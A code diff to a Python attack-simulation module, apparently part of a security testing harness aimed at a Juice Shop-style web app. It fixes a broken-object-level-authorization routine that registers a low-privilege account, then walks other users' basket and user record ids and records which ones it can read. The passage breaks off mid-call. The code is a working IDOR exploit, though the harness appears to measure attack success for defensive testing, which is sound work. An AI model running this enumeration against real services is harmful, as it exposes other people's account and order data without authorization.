@@ -168,11 +168,23 @@ def user_enumeration(a: Actor, pace: float) -> dict:
 
 def idor_bola(a: Actor, pace: float) -> dict:
     _recon(a)
-    # Authenticate as a legitimate-but-low-privilege actor first (best effort).
-    r = a.fire("POST", "/rest/user/login", stage="recon", technique="login", malicious=False,
-               json_body={"email": "attacker@aegis.test", "password": "Aegis!2345"})
+    # A real BOLA attacker holds a legitimate low-privilege account. Register one
+    # (unique per actor), log in, then walk OTHER users' object ids. (An earlier
+    # version logged in as an account that was never registered, so it had no
+    # token and the objective could never be met -- which understated the attack
+    # success rate in the baseline.)
+    import json as _j
+    email, pw = f"attacker-{a.actor_id}@aegis.test", "Aegis!2345xY"
+    reg = a.fire("POST", "/api/Users", stage="recon", technique="register", malicious=False,
+                 json_body={"email": email, "password": pw, "passwordRepeat": pw})
+    my_id = None
     try:
-        import json as _j
+        my_id = _j.loads(reg.body)["data"]["id"]
+    except Exception:
+        pass
+    r = a.fire("POST", "/rest/user/login", stage="recon", technique="login", malicious=False,
+               json_body={"email": email, "password": pw})
+    try:
         a.token = _j.loads(r.body).get("authentication", {}).get("token")
     except Exception:
         pass
@@ -180,8 +192,14 @@ def idor_bola(a: Actor, pace: float) -> dict:
     for bid in range(1, 8):  # walk other users' basket ids
         r = a.fire("GET", f"/rest/basket/{bid}", stage="exploit", technique="bola-basket",
                    note=f"basket {bid}")
-        if r.status == 200 and "\"id\"" in r.body:
-            met, _ = True, found.append(f"basket/{bid}")
+        if r.status == 200:
+            try:
+                owner = _j.loads(r.body)["data"]["UserId"]
+            except Exception:
+                owner = None
+            if owner is not None and owner != my_id:  # someone else's basket
+                met = True
+                found.append(f"basket/{bid} (owner user {owner})")
         _pace(pace)
     for uid in range(1, 6):  # direct object reference to user records
         a.fire("GET", f"/api/Users/{uid}", stage="exfil", technique="idor-user",
